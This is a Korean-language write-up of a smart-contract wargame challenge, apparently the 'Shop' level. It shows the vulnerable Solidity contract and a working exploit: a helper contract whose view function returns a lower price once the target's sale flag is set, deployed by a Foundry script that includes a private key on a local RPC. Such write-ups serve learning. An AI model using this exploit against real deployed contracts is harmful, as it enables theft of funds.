# 지문

"가게에서 요구하는 가격보다 더 적은 금액으로 아이템을 얻을 수 있을까요?"

도움이 될 만한 것들:

* Shop은 **Buyer**로부터 사용될 것으로 기대한다
* **view 함수의 제한사항**을 이해하기

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint256);
}

contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}
```

# 풀이 

문제 대상 contract의 `isSold` flag의 상태에 따라 `price`함수에서 값을 다르게 반환하면됨

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

interface ITarget {
    function buy() external;
    function isSold() external view returns (bool);
}

contract Helper {
    address public target_;

    function trigger(address target) public {
        target_ = target;
        ITarget(target_).buy();
    }
    function price() external view returns (uint256) {
        if(ITarget(target_).isSold() == true)
            return 10;
        return 100;
    }
}
contract SolveScript is Script {
    address public target = 0x1A7A3e29c3c4b3C858f2DeD8bE6ed51A07589ecF;

    function setUp() public {}

    // forge script -vvv script/Solve.s.sol --broadcast --tc SolveScript --legacy --private-key 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a --rpc-url http://localhost:8545
    function run() public {
        vm.startBroadcast();
        Helper helper = new Helper();
        helper.trigger(target);
        vm.stopBroadcast();
    }
}

```